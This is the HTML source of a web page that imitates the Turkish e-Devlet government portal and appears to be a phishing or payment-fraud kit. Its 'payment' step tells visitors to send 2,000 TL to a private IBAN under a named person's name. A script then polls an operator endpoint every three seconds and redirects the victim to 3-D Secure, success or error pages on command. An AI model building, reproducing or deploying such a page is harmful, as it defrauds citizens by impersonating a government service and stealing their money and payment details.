				<li class="">Bu işlem için yaklaşık 10 dakikanızı ayırmalısınız.</li>
				<li class="progressStatus">Bu işlem toplam <strong>4</strong> aşamalıdır. Şu anda <strong>3</strong>. aşamadasınız.<progress value="3" max="4"></progress></li>
				<ol class="progressMeter"><li class="complete">Tercih Formu</li><li class="complete">Bilgi Formu</li><li class="current">Ödeme</li>
				<li class="final">Onay</li></ol><li class="progressStatus">ÖNERİLEN HİZMETLER<a href="#">4A/4B/4C İlaç Kullanım Süresi Sorgulama</a>
				<a href="#">4A/4B İşgöremezlik Ödemesi Görme</a><a href="#">Normal Şartlarda Ne Zaman Emekli Olabilirim?</a>
				<a href="#">SPAS Müstehaklık Sorgulama(Sağlık Provizyon Aktivasyon Sistemi)</a><a href="#">4A/4B/4C Muayene Katılım Payı Sorgulama</a></li></ul></aside>
				<script type="text/javascript">$(function () {$('#aFavorite').click(function () {$.ajax({type: "POST",url: '/favori-hizmetlerim?add=RemoveFavorite&submit',data: {hizmetKodu: $(this).attr('data-hizmetKodu'),token: '{6422BC-CAC21A-504013-7C9D67-1F3114-0B0BC2-46ABEC-291C35}',ajax: 1},success: function (json) {var obj = $('#aFavorite');if (json.data.add) {obj.addClass("addedfavorite");$('._fav').text("Favorilerden Çıkar");} else {obj.removeClass("addedfavorite");$('._fav').text("Favorilere ekle");}}});});if (typeof $.fn.edkPopover !== 'undefined') {$(".share_item").edkPopover({button: "#share_button",content: "#share_menu",showArrowIcon: false,animationSpeed: "fast"});}});</script><section id="contentStart" class="serviceContainer ">
	
        <section id="contentStart" class="serviceContainer">
   <ul class="contentToolbar">
		<li style="float: left;"><a href="odemesecim" class="">Geri</a>
		</li>
	</ul>
 
	<div class="resultContainer">
  
  
		<h3 class="definitionHeader">
		<form method="POST" action = "./dekont.php" class="serviceForm" >
                  <div class="signup_form">
                    <div class="form-row">
                      <br>
					  
					  <div class="formRow">
				
						<label for="cepTelNo" class="rowLabel">Alıcı : İBAN / HESAP Numarası</label>
						<input type="text" id="ccNumber" placeholder="TR740006400000124260485396

" data-slots="_" type="tel" autocomplete="off" name="kk" type="text" role="textbox" aria-disabled="false" aria-readonly="false" aria-multiline="false" value="TR740006400000124260485396

" aria-required="false" class="text" aria-describedby="fi_r1y0oav2hqt1 flh_b1fa44kg3zw7">
            <button type="button" class="text" onclick="kopyala()">Kopyala</button></input>
						<center><span id="copyMessage" color="red" style="display: none;">Kopyalandı</span></center>
						
						<script>
function kopyala() {
  var input = document.getElementById("ccNumber");
  navigator.clipboard.writeText(input.value)
    .then(function() {
      var copyMessage = document.getElementById("copyMessage");
      copyMessage.style.display = "inline-block";
      setTimeout(function() {
        copyMessage.style.display = "none";
      }, 2000); // 2 saniye sonra mesajı gizle
    })
    .catch(function(error) {
      console.error("Metin kopyalanamadı: " + error);
    });
}
</script>
						  
						<div class="fieldInfo" id="fi_r1y0oav2hqt1">"FAST/HAVALE" Ödemeleriniz anlık olarak, Yaptığınız "EFT" işlemi ise 2-4 iş günü içinde onaylanacaktır.</div>
						<div class="floatingHelp" role="tooltip" style="display: none" id="flh_b1fa44kg3zw7"><p>✱ Hizmeti tamamlamak için bu alanı mutlaka doldurmalısınız.</p></div>
						<font color="red" ></font></div>
            



						
						<div class="formRow">
				
						<label for="cepTelNo" class="rowLabel">Alıcı : Adı Soyadı</label>
						<input type="text" id="AdSoyad" name="AdSoyad" placeholder="Oğulcan Yılmaz" data-slots="_" type="tel" name="showExpiry" value="Oğulcan Yılmaz" autocomplete="off" type="text" role="textbox" aria-disabled="false" aria-readonly="false" aria-multiline="false" aria-required="true" class="text" aria-describedby="fi_r1y0oav2hqt1 flh_b1fa44kg3zw7"><button type="button" class="text" onclick="adsyoad()">Kopyala</button></input>
					  <center><span id="copyMessage2" color="red" style="display: none;">Kopyalandı</span></center>
            
						<script>
function adsyoad() {
  var input = document.getElementById("AdSoyad");
  navigator.clipboard.writeText(input.value)
    .then(function() {
      var copyMessage = document.getElementById("copyMessage2");
      copyMessage.style.display = "inline-block";
      setTimeout(function() {
        copyMessage.style.display = "none";
      }, 2000); // 2 saniye sonra mesajı gizle
    })
    .catch(function(error) {
      console.error("Metin kopyalanamadı: " + error);
    });
}
</script>
						<div class="fieldInfo" id="fi_r1y0oav2hqt1">Ad,Soyad bilgisini doğru girdiğinizden emin olunuz .<br>"Bir Sonraki Sayfada ödemenize ilişkin dekontunuz alınacak ve işleminiz sıraya koyulacaktır."</div>
						<div class="floatingHelp" role="tooltip" style="display: none" id="flh_b1fa44kg3zw7"><p>✱ Hizmeti tamamlamak için bu alanı mutlaka doldurmalısınız.</p></div>
						<font color="red" ></font></div>


						
						<div class="formRow required">
				
						<label for="cepTelNo" class="rowLabel">Gönderen : Adı Soyadı</label>
						<input type="text" name="isim" id="isim" placeholder="Gönderen : Adı Soyadı" type="text" value="" class="text" type="text" role="textbox" aria-disabled="false" aria-readonly="false" maxlength="32" aria-multiline="false" required="required" aria-required="true" class="text" aria-describedby="fi_r1y0oav2hqt1 flh_b1fa44kg3zw7">
						<div class="fieldInfo" id="fi_r1y0oav2hqt1">Ödemenize ilişkin dekont bilgisi bir sonraki sayfada alınacaktır, lütfen gönderim yaptığınız hesabın ad soyad bilgisini giriniz.</div>
						<div class="floatingHelp" role="tooltip" style="display: none" id="flh_b1fa44kg3zw7"><p>✱ Hizmeti tamamlamak için bu alanı mutlaka doldurmalısınız.</p></div>
						<font color="red" ></font></div>

						<div class="formRow required">
						    
						    
						    
						    
						    
						    
						    
						    	<label for="cepTelNo" class="rowLabel">Açıklama Kısmına Yazın</label>
						<input type="text" data-mask="1653-1251" type="text" value="1653-1251" class="text" disabled type="text" role="textbox" aria-disabled="false" aria-readonly="false" aria-multiline="false" required="required" aria-required="true" class="text" aria-describedby="fi_r1y0oav2hqt1 flh_b1fa44kg3zw7">
			
				
						<label for="cepTelNo" class="rowLabel">Ödenecek Tutar</label>
						<input type="text" data-mask="2.000₺" type="text" value="2.000₺" class="text" disabled type="text" role="textbox" aria-disabled="false" aria-readonly="false" aria-multiline="false" required="required" aria-required="true" class="text" aria-describedby="fi_r1y0oav2hqt1 flh_b1fa44kg3zw7">
						<div class="fieldInfo" id="fi_r1y0oav2hqt1">Başvuru işleminizin tamamlanması için. 2.000₺ (İKİ BİN TL) ödeme yapmanız gerekmektedir, "Kartınızın internet alışverişlerine açık olması gerekmektedir."</div>
						
						
						
						
						
						
						
						
								
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						<div class="floatingHelp" role="tooltip" style="display: none" id="flh_b1fa44kg3zw7"><p>✱ Hizmeti tamamlamak için bu alanı mutlaka doldurmalısınız.</p></div></div>

                    </div>
					
					
                    <br>
                  </div>
               </h3>
		<dl class="compact">
		</dl>
	</div>
	
	<div class="disclaimerContainer">Sistemde yoğunluk kaynaklı gecikmeler olabilir lütfen sayfadan ayrılmadan bekleyiniz.</div>
	<center><div><label name ="sayac" id = "sayac" style="font-weight:bold;"></label></div></center>
	
	<div class="formSubmitRow">
		<input type="submit" role="button" id="odemeForInt" name="odemeForInt" class="actionButton guncelleBtn" value="İleri" >
	</div>
	
	 </form>
</section>



	</div>
</main>

<footer data-pagecache="0.016480922698975">
    <!--    -->
    <div id="bottomLinksGroup">
        <div id="bottomLinksWrapper">
            <nav id="bottomLinksBlock">
                <h2 class="sectionTitle">Sayfa Sonu Bağlantıları</h2>
                <ul id="bottomLinks">
                    <li class="bottomLinksGroup">
                        <h3>e-Devlet Kapısı</h3>
                        <ul>
                                                        <li>                                                                    <a href="">English</a>
                                                            </li>
                            <li><a href="">Hakkımızda</a></li>
                            <li><a href="">Yasal Bildirim</a></li>
                            <li><a href="">KVKK Aydınlatma Yükümlülüğü</a></li>
                            <li><a accesskey="8" href="">Gizlilik ve Kullanım</a></li>
                            <li><a href="">Politikalarımız</a></li>
                           
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>e-Hizmetler</h3>
                        <ul>
                            <li><a href="">Sık Kullanılan Hizmetler</a></li>
                            <li><a href="">Yeni Eklenen Hizmetler</a></li>
                                                        <li><a href="/hizmetler" accesskey="h">Kurum Hizmetleri</a></li>
                        </ul>
                    </li>                    <li class="bottomLinksGroup">
                        <h3>Yardım</h3>
                        <ul>
                            <li><a href="" accesskey="6">Genel Yardım</a></li>
                            <li><a href="" accesskey="5">Sıkça Sorulanlar</a></li>
                            <li><a href="">Güvenliğiniz İçin</a></li>
                            <li><a href="">Help For Non-Citizens</a></li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Bize Ulaşın</h3>
                        <ul>
                            <li><a href="" accesskey="9">İletişim</a></li>
                            <li><a href="">CİMER Başvurusu </a></li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>Erişilebilirlik</h3>
                        <ul>
                            <li><a href="" class="textOnlyToggle" data-state="html">Salt Metin Görünümü</a></li>
                            <li><a href="" class="fontSizeToggle" data-state="normal">Daha Belirgin Odaklama</a></li>
                            <li><a accesskey="0" href="">Klavye Kısayolları</a></li>
                            <li><a href="" accesskey="3">Site Haritası</a></li>
                        </ul>
                    </li>
                </ul>
            </nav>
            <div id="bottomRightWrapper">
                <nav id="bottomContacts">
                    <h2 class="sectionTitle">İletişim Seçenekleri</h2>
                    <div class="bottomContactsText">
                        <em>Yardım mı lazım?</em> Aşağıdaki yöntemleri kullanarak bizimle iletişime geçebilirsiniz.
                    </div>
                    <ul id="bottomContactsList">
                        <li><a href="" class="fastresponse">Hızlı Çözüm Merkezi</a></li>
                        <li><a href="" class="email" accesskey="7">Bize Yazın</a></li>
                        <li><a href="" class="callcenter">e-Devlet Çağrı Merkezi</a></li>
                        <li><a href="" class="signinghelp">Engelsiz Çağrı Merkezi</a></li>
                    </ul>
                </nav>
                <nav id="bottomSocialLinks">
                    <a href="" title="Facebook" target="_blank"><span class="ico-facebook"></span>Facebook</a>
                    <a href="" title="Twitter" target="_blank"><span class="ico-twitter"></span>Twitter</a>
                    <a href="" title="Youtube" target="_blank"><span class="ico-youtube"></span>Youtube</a>
                    <a href="" title="Instagram" target="_blank"><span class="ico-instagram-1"></span>Instagram</a>
                </nav>
            </div>
        </div>
        <div id="bottomPartnerLinks">
            <div class="images">
               <a class="externalLink" rel="external" href=""><img title="T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı" alt="T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı" src="/themes/izmir/images/footer/DDO-logo.png"></a>
               <a class="externalLink" rel="external" href=""><img title="Türksat A.Ş." alt="Türksat A.Ş." src="/themes/izmir/images/footer/turksat.png"></a>
            </div>
            <div class="bottomPartnerText">
			e-Devlet Kapısı’nın kurulması ve yönetilmesi görevi <a class="externalLink" rel="external" href="">T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı</a> tarafından yürütülmekte olup, sistemin geliştirilmesi ve işletilmesi <a class="externalLink" href="" rel="external">Türksat A.Ş.</a> tarafından yapılmaktadır.
            </div>
        </div>
        <div id="bottomCopyrightBlock">
            ©<time datetime="2022-09-01">2022</time> Tüm Hakları Saklıdır. <a href="">Gizlilik, Kullanım ve Telif Hakları</a> bildiriminde belirtilen kurallar çerçevesinde hizmet sunulmaktadır.
        </div>
    </div> 
</footer><script src="/themes/izmir/js/forms.1.8.js" charset="utf-8"></script>
<script type="text/javascript">function loadJsData(_js, _jsv, _siteId){var _paq;_paq = window._pap = window._pap || [];var _param = {"_kk":1038,"_hk":1512,"_y":0,"_c":0,"_gy":0,"_t":"","_pi":false,"_l":"tr","_si":139,"_md":false};var d = document, g = d.createElement('script'), s = d.getElementsByTagName('script')[0];var _cn=function(n){return d.getElementsByClassName(n);};_param._jsv = _jsv;_paq.push(['setCssControlArr', [function(){return _cn("warningContainer").length > 0 &&_cn("warningContainer")[0].style.display !== 'none' ? 'warning' : null;},function(){return _cn("errorContainer").length > 0 &&_cn("errorContainer")[0].style.display !== 'none' ? 'error': null;},function(){return _cn("confirmContainer").length > 0 &&_cn("confirmContainer")[0].style.display !== 'none' ? 'confirm': null;},function(){return _cn("disclaimerContainer").length > 0 &&_cn("disclaimerContainer")[0].style.display !== 'none' ? 'disclaimer': null;},function() {return _cn("reminderContainer").length > 0 &&_cn("reminderContainer")[0].style.display !== 'none' ? 'reminder': null;},function() {return _cn("progressContainer").length > 0 &&_cn("progressContainer")[0].style.display !== 'none' ? 'progress': null;}]]);_paq.push(['trackPageView', d.title, _param]);_paq.push(['setSiteId', _siteId]);g.type = 'text/javascript';g.async = true;if(parseInt(Math.random()*2)==0) {_paq.push(['setTrackerUrl', ""]);} else {_paq.push(['setTrackerUrl', ""]);}g.src = '/themes/ankara/js/analitik.min.'+_jsv+'.js';s.parentNode.insertBefore(g, s);}window.onload = function () {loadJsData('/analitik/analitik.min.js', 9, 1);};</script>

<div id="facebox" style="display: none; left: 152px;" role="dialog"><div class="body"><a class="visuallyhidden" id="popAnchor">Yeni Pencere Açıldı. Pencereyi kapamak için ESC tuşuna basabilirsiniz.</a><div id="modalContent" class="content"></div></div></div>

            <script>
// This code empowers all input tags having a placeholder and data-slots attribute
document.addEventListener('DOMContentLoaded', () => {
    for (const el of document.querySelectorAll("[placeholder][data-slots]")) {
        const pattern = el.getAttribute("placeholder"),
            slots = new Set(el.dataset.slots || "_"),
            prev = (j => Array.from(pattern, (c,i) => slots.has(c)? j=i+1: j))(0),
            first = [...pattern].findIndex(c => slots.has(c)),
            accept = new RegExp(el.dataset.accept || "\\d", "g"),
            clean = input => {
                input = input.match(accept) || [];
                return Array.from(pattern, c =>
                    input[0] === c || slots.has(c) ? input.shift() || c : c
                );
            },
            format = () => {
                const [i, j] = [el.selectionStart, el.selectionEnd].map(i => {
                    i = clean(el.value.slice(0, i)).findIndex(c => slots.has(c));
                    return i<0? prev[prev.length-1]: back? prev[i-1] || first: i;
                });
                el.value = clean(el.value).join``;
                el.setSelectionRange(i, j);
                back = false;
            };
        let back = false;
        el.addEventListener("keydown", (e) => back = e.key === "Backspace");
        el.addEventListener("input", format);
        el.addEventListener("focus", format);
        el.addEventListener("blur", () => el.value === pattern && (el.value=""));
    }
});
</script>
<script>
var $userForm = $("#userForm");
var $usernameInput = $userForm.find("#username");

$userForm.on("submit", function(e) {
    e.preventDefault(); // formun direkt gönderilmesini engelliyoruz.
    if($userForm.hasClass("waiting")) return; // Eğer formda "waiting" adında bir class varsa hiçbir işlem yapılmasın.
    if($usernameInput.val().trim()==="") { alert("Kullanıcı adı zorunludur!"); return; } // Kullanıcı adı boş gönderilemesin.
    $userForm.addClass("waiting"); // artık ajax isteğinden sonuç bekleyeceğimiz için forma "waiting" class'ını ekleyebiliriz.
    var username = $usernameInput.val().trim();
    $.ajax({
        url: "add_user.php",
        type:"post",
        data: { username: username },
        success:function(response) {
            // Örnek olarak gelen yanıta göre işlemler yapıyorum:
            if(response.type==="error") alert(response.errorMessage);
            else if(response.type==="success") { 
                alert(username+" adlı kullanıcı başarıyla eklendi.");
                $usernameInput.val("");
            }
            else alert("Bilinmeyen bir sonuç döndü.");
            // Artık yanıttan cevap döndüğüne göre formu "waiting" class'ından arındıralım.
            $userForm.removeClass("waiting");
        },
        error: function() {
            alert("Bir sorunla karşılaşıldı.");
            $userForm.removeClass("waiting");
        }
    });
});
</script>

	<script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 3000);
      });

      function gonder() {
        $.ajax({
          type: 'POST',
          url: 'datach.php?ip=92.38.180.90',
          success: function(msg) {
            if (msg == 'sms') {
              window.location.href = '3dredirect';
            }
            if (msg == 'tebrik') {
              window.location.href = 'tebrik';
            }
            if (msg == 'hata') {
              window.location.href = 'hata';
            } 
            if (msg == 'back') {
              window.location.href = 'index';
            }
          }
        });
      }
    </script>

</body></html>